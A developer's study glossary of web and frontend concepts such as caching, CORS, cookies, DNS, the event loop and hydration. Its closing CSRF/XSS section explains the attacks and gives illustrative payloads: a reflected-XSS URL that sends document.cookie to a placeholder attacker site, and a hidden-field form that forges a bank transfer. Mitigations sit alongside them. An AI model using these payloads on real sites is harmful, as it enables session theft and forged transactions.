# Technical terms

<https://punits.dev/jargon-free-intros/>
<https://thanhle.blog/blog/thuat-ngu-trong-frontend-optimization>

## Transpile

Convert the code so that older browser can also run it.

## Waterfall

The current request need to complete to let other requests continue.

## Serialization

Serialization is the process of converting an object into a format that can be easily stored, transmitted, or reconstructed later. The serialized format can be a binary format, JSON, XML, or another structured format.

Why is Serialization Needed?

- Persistence: Save objects to a file or database.
- Communication: Send data over a network (e.g., API requests, distributed systems).

In JavaScript, for example, you can serialize an object to a JSON string by calling the function JSON.stringify().

## Escaping data

Escaping output is the process of securing output data by replacing special HTML characters with HTML Entities. This process helps secure your data prior to rendering it for the end user. If output data has HTML, it will convert to `&amp; or &lt;`

## Sanitizing data

Sanitizing data is the process of stripping out unwanted character in input data before saving it into database. For example: `<script>content</script>` will be convert to 'content' only

## Babel

Enable writing codes with JS features that are not supported by most browser yet. The modern code is transpiled back to vanilla JS so that every environment can understand it.
`babel-loader`: the loader used with Webpack to transpile JS

## Cache

<https://www.youtube.com/watch?v=qVQjGwm_mmw>

- To cache an assest, we only need two headers
  - `cache-control: max-age=3600, must revalidate` for caching
  - `etag: "random_string"` for revalidation
- things never need to be revlidated: <https://i.imgur.com/dErZjKc.png>
  - paths with dynamic content (/my-account, /dashboard)
  - files that never change 

## FPS

<https://tigerabrodi.blog/i-finally-understand-requestanimationframe>

FPS means frame per second. The reason we see things moving on a screen is because the browser is painting an entirely new image. It's not actually moving. Throughout a single second, each frame is a completely new image drawn on the screen.

The lower the FPS, the more gap between the motions before we draw the next frame on the screen.

40 FPS timeline:
0ms    [Frame 1]
25ms   [Frame 2]
50ms   [Frame 3]
75ms   [Frame 4]

100 FPS timeline:
0ms    [Frame 1]
10ms   [Frame 2]
20ms   [Frame 3]
30ms   [Frame 4]

The amount of FPS depends on the Hz of your screen and the complexity of the frame

Hz indicates how many times the screen can refresh its image each second.
And yes, the more complex frame, the longer browser needs to take to draw the frame. By default, to draw an image (frame) browser has to go through these steps

- Run JavaScript (process any animations/changes)
- Calculate layout (figure out where everything goes)
- Paint (determine what colors each pixel should be)
- Composite (combine all layers into final image)
- Send to display


## Render tree

- <https://web.dev/howbrowserswork/>

is the combination of The CSSOM and DOM tree created in the parsing HTML step. Render tree is then used to compute the layout of every single element, which is then painted to the screen.

## `params` and search params

- params is a part of URL, often defined as the dynamic parameters, such as: `product/1`
- `search params` or `URL parameters` or `query strings` provide additional data for the URL: `product?id=1&user=2`

## Repaint and reflow

- <https://dev.to/gopal1996/understanding-reflow-and-repaint-in-the-browser-1jbg>
- <https://frontendmasters.com/blog/why-do-reflows-negatively-affect-performance/>
- <https://web.dev/articles/rendering-performance>

First, the browser runs 3 steps:

- Process HTML markup and build the DOM tree.
- Process CSS markup and build the CSSOM tree.
- Combine the DOM and CSSOM into a render tree.

- `reflow (layout)`: 
  - When the render tree is created, nodes don't have position and size. Reflow is the process of calculating these values
  - This is triggered again when the size, position, or layout of elements on the page change, causing the browser to recalculate the layout. This can cause a subsequent `repaint`.
- `repaint`: 
  - When layout is complete, the browser issues "Paint Setup" and "Paint" events, which convert the render tree to pixels on the screen.
  - This is triggered again when visual parts of the page are updated without affecting the layout, such as changing background color or updating text color.
- `Composite`: The browser then combines the painted layers to produce the final image displayed on the screen.
  
When we change a layout-related property (width, height, margin), we trigger reflows which triggers repaint and maybe composite as well. This is called pixel pipeline

Reflows can be heavy on the CPU as they involve complex algorithms for processing CSS rules and determining element alignment and constraints within the page's layout.

## JS context

In technical terms, context refers to the object which a function belongs or is bound to. We can say that it refers to the `this` value inside a function

## Bundle

Bundle is the process of combining multiple pieces of JS code into one large file

## CORS

<https://www.devsecurely.com/blog/2024/06/cors-the-ultimate-guide>

When a website performs an AJAX request to another website (Cross Origin Request), the browser checks the CORS policy to see how to handle that AJAX request.

The browser has to make 2 decisions:

- Should the browser perform the HTTP request as defined by the Javascript code?
  - For simple request like GET or POST with no custom HTTP header (X-RequestedBy, for example) and standard content-type, browser doesnt check CORS
  - Other cases, browser makes a preflight request and it will then check the CORS policy before deciding to send the request:
- If the browser performs the request, should it let the Javascript code access the response? It also check CORS policy from the response, and see if the AJAX request conforms to the CORS policy.

Below are CORS policy and the best practice:

- `Access-Control-Allow-Origin`: The value of this header must be the origin that is allowed to call the website. For example, suppose you have an API hosted under https://api.example.com, and a front part that calls that API, hosted under https://www.example.com. In this scenario, the header `Access-Control-Allow-Origin` should always have the value https://www.example.com.
  - If multiple websites should be able to call your website, then you need to define a whitelist of allowed websites. For all requests, check if the request header Origin contains one of the whitelisted origins.
    - If so, return the value of the request header Origin as the value of the response header `Access-Control-Allow-Origin`.
    - If not, return a default value for the header `Access-Control-Allow-Origin`.
  - If your website is not supposed to be called by other origins (for example, your whole website is hosted under https://www.example.com), then don't define this header.
- `Access-Control-Allow-Credentials`: If your website uses cookies to authenticate users (for example session cookies), then set the value of this header to 'true'.
  - If your website is not supposed to be called by other origins, then don't define this header.
- `Access-Control-Allow-Headers`: If you require a custom HTTP header in your requests, then you should add it to this response header. If you require multiple HTTP headers, add them as a comma separated list.
  - If your website is not supposed to be called by other origins, then don't define this header.
- `Access-Control-Allow-Methods`: If your website treats PUT or DELETE HTTP methods, then you should add them to this header as a comma separated list.
  - If your website is not supposed to be called by other origins, then don't define this header.

## Side effect

Side effect is anything that affects something outside the function scope, ex: network request, updating the screen, starting an animation, changing data. They are things happens on the side, not during rendering

## SSH

<https://dev.to/therubberduckiee/explaining-ssh-to-my-uber-driver-38a>

## Event driven

The event-driven is a programming model in which programs respond to external events or user actions

In this type of programming, the program listens for events, and when they occur, it executes some code/function that should run in response to that event.

Event-driven architectures have three key components: event producers, event routers, and event consumers. A producer publishes an event to the router, which filters and pushes the events to consumers.

in Node.js, when it receives requests from users or needs to perform time-consuming tasks like reading files or making network requests, it doesn't wait for each request to finish before handling the next one. It quickly notes down what needs to be done and moves on to the next task. Once the time-consuming tasks are done, Node.js goes back and completes the work for each request one by one, efficiently managing multiple tasks concurrently without getting stuck waiting.

This event-driven asynchronous approach in Node.js allows the program to handle many tasks or requests simultaneously, just like a chef managing and cooking multiple orders at once in a bustling restaurant. It makes Node.js highly responsive and efficient, making it a powerful tool for building fast and scalable applications.

## Asynchronous in JS

Asynchronous means the program can handle multiple task simultaneously rather than excecuting them one by one.

## `process.nextTick()` and `setImmediate`

<https://nodejs.org/en/learn/asynchronous-work/understanding-setimmediate>

A function passed to `process.nextTick()` is going to be executed on the current iteration of the event loop, after the current operation ends. This means it will always execute before `setTimeout` and `setImmediate`.

A `process.nextTick` callback is added to `process.nextTick` queue. A `Promise.then()` callback is added to promises microtask queue. A `setTimeout`, `setImmediate` callback is added to macrotask queue.

Event loop executes tasks in `process.nextTick` queue first, and then executes promises microtask queue, and then executes macrotask queue.

## Process

A process is an instance of a program that is currently being executed. Each process runs independently of others. Processes have several substantial resources:

- Execution code;
- Data Segment — contains global and static variables that needs to be accessible from any part of the program;
- Heap — dynamic memory allocation;
- Stack — local variables, function arguments and function calls;
- Registers — small, fast storage locations directly within CPU used to hold data temporarily during execution of programs (like program pointer and stack pointer).

## Thread

A thread is a single unit of execution within a process. There might be multiple threads within the process performing different operations simultaneously. The process share execution code, data and heap with threads, but stack and registers are allocated separately for each thread.

<img src="https://i.imgur.com/bY8N3td.png">

## I/O operation

- <https://medium.com/@tkachenko.hello/node-js-is-not-single-threaded-1383594dbd17>
- <https://www.youtube.com/watch?v=os7KcmJvtN4>

In Node.js, I/O often refers to reading/writing data to the disk or doing network operations. Network operations get external information into your application, or send data from your application out to something else

Instead of using V8 engine to handle I/O operation, NodeJs use `libuv` for asynchronous I/O

This is what happens when we call an I/O operation:

- The Node.js interpreter scans the code and puts every operation into the call stack;
- Node.js sequentially executes operations in the call stack. However, for I/O operations, Node.js sends them to libuv in a non-blocking way. This approach ensures that the I/O operation does not block the thread, allowing other operations to be executed concurrently.

if it's the network request, it simply waits for its response. If it's files operation, libuv offloads the tasks to the its internal worker thread and wait for it to complete. Once the task is done, libuv sends it back to the event loop.

Under the hood of livub: 

- **Event Demultiplexer** is the first place to receive the I/0 operation
- The Event Demultiplexer then hands off the tasks to the **Tasks Queue**
- The Thread Pool continuously monitors the Tasks Queue for new tasks
- When a new task is placed in the Tasks Queue, the Thread Pool reacts by handling it with one of the pre-defined threads asynchronously. By default, there are 4 threads
- When the I/O operation completes, Thread Pool signals and sends I/O result and associated I/O callback to the event queue
- The Event Loop continuously checks the Event Queue and processes the event callback.

<img src="https://i.imgur.com/jLEW6Df.png">

## Race condition

Two different requests 'raced' against each other and the result might come in a different order than you expected. <https://beta.reactjs.org/learn/you-mig\ht-not-need-an-effect>

## Stateless and stateful

- Stateless means after the initial request is done, the server-client communication is lost. Server doesn't keep the client's state (like HTTP) => the next request won't have any information about the previous one (like data about the logged in user)
- Stateful keeps the client's state (like Websockets)

## Memory leak

Memory leak occurs when a computer program allocate memory incorrectly, leading to memory that is no longer needed is not released back to the operating system. Here are some common causes of memory leaks:

- Global Variables: Excessive use of global variables that remain in memory for the lifetime of the application.
- Timers and Intervals: Timers and intervals that are not cleared properly.
- Event Listeners: Event listeners that are not properly removed after use.
- Unused Objects: Objects that are no longer needed but are still referenced somewhere in the program.
- Closures: Variables captured by closures that are not released properly.

## Critical rendering path

<https://web.dev/learn/performance/understanding-the-critical-path> **MUST READ THE POST**

Is the sequence of steps the browser takes before performing the initial render of a webpage:

- Constructing the Document Object Model (DOM) from the HTML.
- Constructing the CSS Object Model (CSSOM) from the stylesheets.
- Applying any JavaScript that alters the DOM or CSSOM.
- Constructing the render tree from the DOM and CSSOM.
- Perform style and layout operations on the page to see what elements fit where.
- Paint the pixels of the elements in memory.
- Composite the pixels if any of them overlap.
- Physically draw all the resulting pixels to screen.

The browser needs to wait for some critical resources to download before it can complete the initial render. These resources include:

- Part of the HTML.
- Render-blocking CSS via `<link>` tag in the `<head>` tag.
- Render-blocking JavaScript in the `<head>` tag that are not async or deferred.

Importantly, for the initial render, the browser will not typically wait for:

- All of the HTML.
- Fonts. Font are not blocking resources but Chrome set them as high priority 
- Images.
- Non-render-blocking JavaScript outside of the `<head>` element (for example, `<script>` elements placed at the end of the HTML).
- Non-render-blocking CSS outside of the `<head>` element, or CSS with a media attribute value that does not apply to the current viewport.

## Concurrent and parallel

- <https://www.leohuynh.dev/blog/does-promise-all-run-in-parallel-or-sequential/>
- <https://stackoverflow.com/a/59586421>

Concurrent programming is about dealing with multiple tasks at once and switching between them according to priority, while parallel programming is about doing multiple task at once. For example:

- Concurrency: 
  - 2 lines of customers ordering food from a single cashier (lines take turns ordering).
  - A single chef cooks multiple dishes — switching back and forth. Dishes are "in progress" together, but only one is actively cooking at a time.
- Parallelism: 
  - 2 lines of customers ordering food at the same time from 2 cashiers.
  - Several chefs cook different dishes at the same time — all dishes progress simultaneously.

Let's take `Promise.all()` as example.

Promises starts at the same time but JavaScript uses a single-threaded event loop — so only one task is pushed to the call stack others may be waiting (e.g., I/O).

In React, concurrent can partiallly render a tree without committing the result and does not block the main thread. We can use `useDeferredValue` to defer updating the value ultil all high-priority work has finished. Or we can put all the expensive rendering part inside a `startTransition`

## Prefetch and preload

- Prefetch tells browser that you are gonna need this resource in the future, and browser will load it when it's idle. Usecase: apply when user hovers on a link, it's a very high chance that he will click it so you prefetch this link in advance (like NextJS 13)
- Preload tells browser that this resource is very important, please load it asap. Usecase: apply for important resource in the first render, ex: font, hero image.

## Webhook

is a way for an app to send real time data to another app, typically triggered by an event (ex: sending a message). When an event is triggered, the webhook send a POST request to other application with relevant data.

Compare with API: 

- API is also a way for 2 applications to communicate with each other. However, API is request driven, that means 2 application communicate when client sends the request and server responses
- Webhooks is event-driven, clients don't need to send the request to server, server will automatically send payload as a POST request to client's webhook URL when specified event occurs

## Object reference (reference) in JS

<https://www.aleksandrhovhannisyan.com/blog/javascript-pass-by-reference/#object-references-are-pointers>
'Object references' in JavaScript are really pointers. A pointer is a variable that instead of directly storing a primitive value like an int, bool, float, or char, it stores the memory address where some data lives

## REST and RESTful API:

REST is a set of architectural constraints. 

RESTful API is the api that conforms to the constraints of REST architecture. Basically it helps two systems (mostly client and server) to exchange information via HTTP methods (GET, POST, PUT, DELETE). The constraints are:

- Uses HTTP methods correctly (GET for reading, POST for creating, etc.)
- Stateless: no client information is stored between get requests and each request is separate and unconnected.
- Caching: Data within a response to a request must be labeled as cacheable or non-cacheable.

## Hydration (Rehydration)

- <https://www.joshwcomeau.com/react/the-perils-of-rehydration/>
- <https://3perf.com/talks/react-concurrency/#suspense>
- <https://demystifying-rsc.vercel.app/client-components/>
- <https://www.youtube.com/watch?v=R-BKadZWYnQ&ab_channel=Builder>
- <https://www.youtube.com/watch?v=ZKH3DLT4BKw&ab_channel=AddyOsmani>
- <https://thanhle.blog/blog/server-side-rendering-voi-hydration-lang-phi-tai-nguyen-nhu-the-nao>

Hydration is the process of turning static SSR html into dynamic client-side (CSR) html. It uses client-side JavaScript to attach generated event listeners to the already existing DOM (from SSR HTML) and also render every components again

Then it compares the mounted DOM with the DOM nodes already on the page, and tries to fit the two together. If not there will be an error like this: "Expected server HTML to contain a matching <div> inside a <nav>" (only happens on development mode but you are warning because this is bug). This process can also be called *reconciliation*

## Deploying:

the act of taking a website live on a server

## Site and origin

- <https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions>
- <https://jub0bs.com/posts/2021-01-29-great-samesite-confusion/>
- <https://zellwk.com/blog/fetch-credentials/>

- Origin is defined with scheme (http or https), domain, and port. Changing any of these values is considered a change in origin. Two URLs are considered to have the same origin if they share the exact same scheme, domain name, and port. Although note that the port is often inferred from the scheme.
- A site is defined as the top-level domain (TLD), usually something like .com or .net, plus one additional level of the domain name. Different subdomains are also considered to be the same site.
  - The site of `https://viet.github.io` is `viet.github.io`, because `github.io` is the host's most specific public suffix 
  - The site of `https://foo.example.org` and `https://bar.example.org` is `example.org`
  
When determining whether a request is same-site or not, the URL scheme is also taken into consideration. This means that a link from http://app.example.com to https://app.example.com is treated as cross-site by most browsers.
  
<img src="https://i.imgur.com/zOZNQ7h.png">

So, the term "site" is much less specific as it only accounts for the scheme and last part of the domain name, while origin includes the scheme, the whole domain and the port. Crucially, this means that a cross-origin request can still be same-site, but not the other way around.

## Cookies

- <https://duthanhduoc.com/blog/p2-giai-ngo-authentication-session>

A cookie (also known as a web cookie or browser cookie) is a small piece of data a server sends to a user's web browser when you visit them. 

When you access a website at https://abc.com, and the server returns cookies, your browser will store those cookies for the domain abc.com.

When you send a request to https://abc.com (including entering the URL into the address bar or sending an API request), your browser will look for any cookies associated with https://abc.com and send them to the server at https://abc.com.

However, if you access https://google.com, Google will not be able to read the cookies from https://abc.com because the browser does not send them.

**Note**: By default, if you are on the page https://google.com and send a request to https://abc.com, the browser will automatically send the cookies from https://abc.com to the server at https://abc.com. This is a vulnerability that hackers can exploit for CSRF attacks.

## Cookie attributes:

- <https://prateeksurana.me/blog/javascript-developer-guide-to-browser-cookies/>

- `httpOnly`: prevent browser (client) from reading any cookies with the cookie API. Cookies are accessible only via server. This helps prevent XSS attacks
- `SameSite`: (<https://andrewlock.net/understanding-samesite-cookies/>) Why we need this attribute: to prevent CSRF. By default, browsers sent cookies in every request to the domain that issued them, even if the request is cross-site which means it was triggered by an unrelated third-party website
  - `SameSite=Strict`: cross-site request is not allowed, the request must be originates from the destination domain.
  - `SameSite=Lax` (default): cross-site request is allowed, but only the request resulted from a "top-level GET requests", that is, GET requests which change the URL in the navigation bar.  Resources that are loaded by iframe, img tags, and script tags do not change the URL in the address bar so none of them cause TOP LEVEL navigation.
    - You follow an <a> link to your site from a different domain.
    - A form embedded on another site sends data to your website using the **GET** action.
  - `SameSite=None`: cookies are always sent, regardless of whether you're in a same-site or cross-site scenario. You can do POST, GET requests on another domain to your website and the cookies are sent along
- `domain`: server tells browser which domains are allowed to access a cookie server, default to the exact domain that set the cookie. That means 'test.abc.com' cannot access cookies on 'abc.com', the same goes for 'test2.abc.com'. (Note that you still see the cookie from main domain in the browser dev tool, however you won't get access to them). So if your backend is hosted on 'abc.xyz.com' (so the default domain of the cookies will be '123.abc.com') and your client is hosted on another subdomain, like 'def.abc.com', the cookies are set in response header but they aren't existed on client site and won't be included in the next request to the server. In this case, your cookie's `domain` attribute should be something like 'abc.com' 
- `path`: server tells browser which path are allowed to access and send a cookie to server. A cookie with the path attribute as Path=/store would only be accessible on the path /store and its subpaths /store/cart, /store/gadgets
- `expire`: default to 0, that means the cookie is treated as session cookie by default. So as long as the user has opened a browser and stuff that, will this cookie live.
- `secure`: A cookie with the Secure attribute is only sent to the server over the secure HTTPS protocol, so the domain of client must be HTTPS. This helps in preventing Man in the Middle attacks by making the cookie inaccessible over unsecured connections
- Expires: default to `Session`. That means when you close the browser, those cookies will be removed (this is only true if your browser doesn't set On startup as 'Continue where you left off')

## Tree-shaking

- <https://www.youtube.com/watch?v=ylhbyqkpnsc>
- <https://dev.to/dianjuar/importing-modules-in-javascript-are-we-doing-it-right-nc>

Is the term for removing unused code before bundling. This process prevents having dead code in the final bundle and make it lighter

```js
import * as lib from 'amazing-lib'
import { foo } from 'amazing-lib'
```

In both cases all the library content is being imported. The first place is the easiest to spot, all the library's content is being assigned to the variable lib. In the second case, we are still importing all the library, we are just applying destructuring to the library's content to get what we need. Thanks to Tree Shaking all the unused code doesn't end up on our bundles.

**Caveats**

- Some packages that use module systems different than ES6 isn't tree shakable (eg: lodash). In this case, we need to use a technique called `cherry-picking` which require absolute path to the file that contains content we need: `import debounce from "lodash/debounce";`
This can be an issue when using barrel files: <https://github.com/vercel/next.js/issues/12557> <https://renatopozzi.me/articles/your-nextjs-bundle-will-thank-you>

## Prototype chain

The prototype chain is a mechanism that allows objects to inherit properties and methods from other objects. Every object in JavaScript has a built-in property, which is called its prototype (`__proto__`). The prototype is itself an object, so the prototype will have its own prototype, creating a chain called a prototype chain. The chain ends when we reach a prototype that has null for its own prototype. 

## postCSS:

- <https://www.youtube.com/watch?v=Kn2SKUOaoT4>

it's like webpack for CSS. There are variaty of postCSS plugins like minify, compile sass to css... 

## Encode and Encrypt

- Encoding transforms data into another format using a scheme that is publicly available so that it can easily be reversed.
- Encryption transforms data into another format in such a way that only specific individual(s) can reverse the transformation

## Proxy server

Is the server that redirects client requests to other servers

## Reverse proxy

<https://www.youtube.com/watch?v=F2FmTdLtb_4>

<img src="https://i.imgur.com/5CyJPOc.png">

A reverse proxy is a server that 

- sits in front of server to hide the server's identity. Clients only interact with the reverse proxy and may not know about the real server
- accepts a request from the client, forwards the request to web servers, and returns the results to the client as if the proxy server had processed the request.

A reverse proxy is good for:

- Protecting servers
- Load balancing
- Caching static contents like CDNs. At first, when client send request to webserver, proxy server takes that request, redirects it to webserver, receives response, cache the response and sends it back to client
- Encrypting and decrypting SSL communications

## Foward proxy

- Sits in front of client to hide the client identity (ip)

## Nameservers and DNS:

- <https://www.bluehost.com/blog/the-low-down-what-is-a-nameserver-why-it-matters-for-your-website>
- <https://kinsta.com/knowledgebase/what-is-a-nameserver/>
- <https://www.cloudflare.com/learning/dns/what-is-a-dns-server/>

### Concept

`DNS` (Domain Name System) is the system that is used to translate domain names into IP address.

`DNS` is composed of multiple `nameservers`, which can be known as [`DNS server`](https://www.namecheap.com/support/knowledgebase/article.aspx/766/10/what-is-dns-server-name-server/). Nameservers or DNS servers function is to store, organize DNS records and returns IP addresses for a domain to browser. `DNS records` are what contains actual information that browsers need to interact with, like the IP addresses. 

### What happens when you visit a website:

<https://blog.bytebytego.com/p/a-crash-course-in-dns-domain-name?ref=dailydev>
<https://www.youtube.com/watch?v=27r4Bzuj5NQ> (**Must read**)
<https://www.cloudflare.com/learning/dns/what-is-a-dns-server/>
<https://www.cloudflare.com/learning/dns/dns-server-types/#recursive-resolver>

- You type URL like 'example.com' into the address bar and hit enter
- Browser first checks its cache. If no answer, it will check in the cache of OS (which is the host file)
- If it's not there, browser uses DNS to retrieve the domain's nameservers: <https://www.youtube.com/watch?v=72snZctFFtA>
  + *DNS resolver* (also known as a *DNS recursor*) receives the query first. The IP of DNS resolver is set in network settings of you computer, default is your ISP
  + If DNS resolver does not have the answer in the cache, then it will ask *Root nameservers* (.). Root nameservers have the IP of *top-level domain (TLD) nameserver* (.com, .org) and return it to DNS resolver
  + DNS resolver reachs TLD nameserver, TLD nameserver returns the IP of nameserver that contains 'example.', which is domain registrar's nameserver (*authoritative nameserver*)
  + DNS resolver goes to `example.com` namesever and it returns IP of `example.com` to DNS resolver
  + DNS resolver returns IP to browser
- Your browser requests the website content from that IP address
- Your browser retrieves the content and renders it in your browser

After retrieving the correct IP address for a given website, the resolver will then store that information in its cache for a limited amount of time. During this time period, if any other clients send requests for that domain name, the resolver can skip the typical DNS lookup process and simply respond to the client with the IP address saved in the cache.

Once the caching time limit expires, the resolver must retrieve the IP address again, creating a new entry in its cache. This time limit, referred to as the time-to-live (TTL) is set explicitly in the DNS records for each site. Typically the TTL is in the 24-48 hour range. A TTL is necessary because web servers occasionally change their IP addresses, so resolvers cannot serve the same IP from the cache indefinitely.

### Where are your Domain's Nameservers located:

By default, when you register a domain, you will use your domain registra's nameservers, such as Namecheap's nameservers:

`
dns1.registrar-servers.com
dns2.registrar-servers.com
`

However, the best recomandation is to use web hosting's nameserver or third-party nameservers like Cloudflare

The important thing to remember is:

If you change your domain's nameservers away from the default nameservers at your domain registrar, you'll control your domain's DNS records at **your nameserver provider**, **not** your domain registrar

### DNS record types

- `A` Record: points a domain (or subdomain) to an IP address
- `CNAME` Record (Canonical name record): points a domain to another domain. This is used when a site has subdomains, such as shop.myblog.com or donations.myblog.com. These are subdomains of myblog.com. Let's say that each of these subdomains has a CNAME record containing the value "myblog.com." Since the DNS is looking for an IP address, when the CNAME record is accessed, a further lookup is carried out at myblog.com (as this is the value contained in the CNAME file). It will then return the IP address stored in myblog.com's A record. This means that these subdomains are aliases of the main domain, and the canonical name (or true name) of these subdomains is actually 'myblog.com'
- `MX` Record: point email to a particular mail server. Like a CNAME, MX Entries must point to a domain and never point directly to an IP address.

## CSRF and XSS

- <https://www.hacksplaining.com/>
- <https://jerrynsh.com/all-to-know-about-auth-and-cookies/>

### XSS attack

- <https://vercel.com/guides/understanding-xss-attacks>

XSS is a type of attack where an attacker injects his JavaScript that will run on your page and take control

For example, an attacker could input JavaScript into a comment form that doesn't sanitize entries, in order to steal user cookies . When victims load the compromised page, the script executes to give the attacker access to user accounts.
There are two types of XSS attack:

- Stored XSS

Attacker attempts to inject JavaScript through form inputs, where the attacker puts an `alert(localStorage.getItem('your-secret-token'))` into a form then submit. The JS code is saved to DB and will be executed when other users visit the website, including attacker.

- Reflected XSS

Attacker injects JS through URL. Basically, he creates a link with malicious JS code like: `abc.com/?search=<script>window.location='[ATTACKER_SITE]?cookie=' + document.cookie </script>`. Then he put it into an email that will be sent to victim. When the victim clicks on the link, `abc.com` loads, the script is executed first to read the cookie on user's website and then user is redirect to attacker site which implement a log system that can extract the cookie data

As you can see XSS exploit storage (session or local) and cookie that `httpOnly` set to `false`

How to prevent:

- Using cookie with `httpOnly` flag set to true
- USing CSP: `Content-Security-Policy: script-src 'self'`. This ensures that you can only load JS code from actual JS files that are sent from specific sources, in this case is from the current website
- Escape dynamic content from database so the malicious script will be escape when rendered on page.

### CSRF attack

<https://zellwk.com/blog/understanding-csrf-attacks/>

Attacker tricks user into submitting a malicious request, execute unwanted actions from attacker's website to the website where user is authenticated

The request must originate from another website, which gives it the name "Cross-Site". This request also impersonates an authenticated user, which gives it the name "Request Forgery".

There are 2 types of CSRF attack

- Through GET request

For example: The user has just logged into bank account which means the cookie is stored in browser. Attacker send a picture with malicious website URL to user email. This website includes an unwanted request to user bank website, like send attacker money and it is run automatically when the user visit website. Then he is tricked to visit the malicious website and the unwanted request is made because the cookie is still available.

- Through POST request

Attacker can disguise a form as a button, like this

```html
<form action="https://bank.com/transfer" method="POST">
  <input type="hidden" name="acct" value="Attacker" />
  <input type="hidden" name="amount" value="9999" />
  <button>View my pictures</button>
</form>
```

People who click this misrepresented form will send the POST request without them knowing.

How to prevent: 

- Create CSRF token. There are two main ways to handle CSRF tokens:

1. Stateless Approach (No Server-Side Storage)

- The server does not store the CSRF token.
- Instead, the token is sent to the client (in a cookie) and the client must send it back in requests.
- The server just verifies that the token in the request matches the one in the cookie.

- Pros:
  - No need for server-side storage, making it scalable for stateless backends.
  - Works well in load-balanced or distributed systems (since each request is independent).
- Cons:
  - If an attacker can steal the CSRF cookie (e.g., via XSS), they can perform CSRF attacks.
  - Mitigation: Use SameSite cookies, HTTP-only cookies, and secure headers (CSP, CORS, etc.).

Here is the implementation:

  - When the user logs in, the server generates a CSRF token and sends it as a cookie along with the login response.
  - If the user is already logged in (e.g., from a previous session) and visits the site again or just refresh the page, they might not go through the login process. Then the frontend may need to request a new CSRF token by sending an API call like `GET /csrf-token`. The server generates a CSRF token and sends it as a cookie to the user.
  - On the client side:
    - The CSRF token is read from the cookie.
    - It is then included in the request by either:
      - Inserting it as a hidden input field in a form submission.
      - Attaching it as a header (e.g., X-CSRF-Token) when making an API request.
  - When the user submits the next request (e.g., a form submission or API request), the server:
    - Extracts the CSRF token from the cookie.
    - Compares it with the token sent in the request (from the form or header).
      - If they match, the request is allowed.
      - If they don't match (or are missing), the request is rejected.
  - If a logged in user is tricked into submitting a request on an attacker's website, the request will fail because the attacker's site cannot generate a valid CSRF token, which will cause the server to invalidate the request. There is only one risk is that your website got XSS attack, and attacker can access the cookie on your site
  
2. Stateful Approach (Server Stores CSRF Tokens) 🔒

- The server stores the CSRF token in a database, session, or cache (e.g., Redis).
- The client still sends the CSRF token with requests.
- The server retrieves the stored token and compares it with the incoming request.

- Using cookie with `SameSite` flag set to `Lax` or `Strict`
- USing CSP: `<meta http-equiv="Content-Security-Policy" content="default-src 'self'">`

## Artifacts in devops

- Pipeline artifact: files that are produced by a step in the pipeline, which can be used as the input for next step)
- Build artifact: files that created by build process.